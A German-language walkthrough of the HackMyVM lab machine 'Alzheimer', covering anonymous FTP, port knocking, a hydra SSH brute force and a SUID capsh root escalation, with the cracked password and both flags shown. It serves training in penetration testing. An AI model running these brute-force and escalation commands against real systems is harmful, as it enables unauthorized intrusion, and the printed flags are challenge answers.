# Alzheimer - HackMyVM Lösungsweg

![Alzheimer VM Icon](Alzheimer.png)

Dieses Repository enthält einen Lösungsweg (Walkthrough) für die HackMyVM-Maschine "Alzheimer".

## Details zur Maschine & zum Writeup

*   **VM-Name:** Alzheimer
*   **VM-Autor:** DarkSpirit
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad (laut Writeup):** Einfach (Easy)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=alzheimer](https://hackmyvm.eu/machines/machine.php?vm=alzheimer)
*   **Autor des Writeups:** DarkSpirit
*   **Original-Link zum Writeup:** [https://alientec1908.github.io/AlienTec1908-Alzheimer_HackMyVM_Easy/](https://alientec1908.github.io/AlienTec1908-Alzheimer_HackMyVM_Easy/)
*   **Datum des Originalberichts:** 28. Oktober 2022

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `ftp`
*   `cat`
*   `nc` (netcat)
*   `gobuster`
*   `nikto`
*   `hydra`
*   `ssh`
*   `sudo`
*   `ls`
*   `find`
*   `install` (versucht für Privilegienerweiterung, aber nicht der erfolgreiche Weg)
*   `capsh`
*   `id`

## Zusammenfassung des Lösungswegs

Das Folgende ist eine gekürzte Version der Schritte, die unternommen wurden, um die Maschine zu kompromittieren, basierend auf dem bereitgestellten Writeup.

### 1. Reconnaissance (Aufklärung)

*   Die Ziel-IP `192.168.2.113` wurde mittels `arp-scan -l` identifiziert.
*   Ein `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.113 -p-`) ergab:
    *   **Port 21/tcp (FTP):** Offen (vsftpd 3.0.3). **Anonymer FTP-Login war erlaubt.**
    *   **Port 22/tcp (SSH):** Gefiltert.
    *   **Port 80/tcp (HTTP):** Gefiltert.
*   Verbindung zum FTP-Server als anonymer Benutzer (`ftp 192.168.2.113`, Benutzer `Anonymous`, kein Passwort):
    *   Eine versteckte Datei `.secretnote.txt` wurde gefunden und heruntergeladen (`get .secretnote.txt`).

### 2. Port Knocking

*   Der Inhalt von `.secretnote.txt` enthüllte eine Port-Knocking-Sequenz:
    ```
    I need to knock this ports and
    one door will be open!
    1000
    2000
    3000
    ```
*   Nachdem die Port-Knocking-Sequenz durchgeführt wurde (z.B. mit `nmap -Pn --max-retries 0 -p <port>` für jeden Port in der Reihenfolge oder einem dedizierten Tool), zeigte ein erneuter Scan der Ports 22 und 80 (`nmap -sS -sC -T5 -A 192.168.2.113 -p80,22`):
    *   **Port 22/tcp (SSH):** Jetzt **offen** (OpenSSH 7.9p1).
    *   **Port 80/tcp (HTTP):** Jetzt **offen** (nginx 1.14.2).

### 3. Web Enumeration (Web-Aufklärung)

*   Der Hostname `alzheimer.hmv` wurde zur `/etc/hosts`-Datei des Angreifers hinzugefügt und auf `192.168.2.113` gesetzt.
*   `gobuster` wurde verwendet, um Verzeichnisse auf `http://alzheimer.hmv` zu finden:
    ```bash
    gobuster dir -u http://alzheimer.hmv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x html,txt
    ```
    *   Gefundene Verzeichnisse: `/home`, `/admin`, `/secret`.
*   Manuelles Durchsuchen der Seiten enthüllte Notizen eines Benutzers `medusa`, der sein Passwort verloren hatte und erwähnte, es sei in einer `.txt`-Datei.
    *   z.B. auf `http://alzheimer.hmv/`: "I dont remember where I stored my password :( I only remember that was into a .txt file... -medusa"

### 4. Initialer Zugriff (Initial Access)

*   Basierend auf dem Benutzernamen `medusa` und dem Passworthinweis wurde `hydra` verwendet, um das SSH-Login per Brute-Force zu knacken:
    ```bash
    hydra -l medusa -P /usr/share/wordlists/rockyou.txt ssh://alzheimer.hmv -I -T 64
    ```
*   **Passwort gefunden:** `Ihavebeenalwayshere!!!`
*   Erfolgreicher Login als `medusa` via SSH:
    ```bash
    ssh medusa@alzheimer.hmv
    ```

### 5. Privilegienerweiterung (Privilege Escalation)

*   Als `medusa` zeigte `sudo -l`, dass der Benutzer `/bin/id` als `ALL` mit `NOPASSWD` ausführen konnte, was nicht direkt für eine Privilegienerweiterung ausnutzbar war.
*   Die `user.txt`-Flag wurde im Home-Verzeichnis von `medusa` gefunden.
*   Suche nach SUID-Binärdateien:
    ```bash
    find / -type f -perm -4000 -ls 2>/dev/null
    ```
*   Dies enthüllte `/usr/sbin/capsh` als SUID-Root-Binärdatei.
*   Unter Verwendung der GTFOBins-Methode für `capsh` mit SUID:
    ```bash
    /usr/sbin/capsh --gid=0 --uid=0 --
    ```
*   Dieser Befehl lieferte erfolgreich eine Root-Shell.

### 6. Flags

*   **User-Flag (`/home/medusa/user.txt`):**
    ```
    HMVrespectmemories
    ```
*   **Root-Flag (`/root/root.txt`):**
    ```
    HMVlovememories
    ```

## Haftungsausschluss (Disclaimer)

Dieser Lösungsweg dient zu Bildungszwecken und zur Dokumentation der Lösung für die "Alzheimer" HackMyVM-Maschine. Die Informationen sollten nur in ethischen und legalen Kontexten verwendet werden, wie z.B. bei CTFs und autorisierten Penetrationstests.
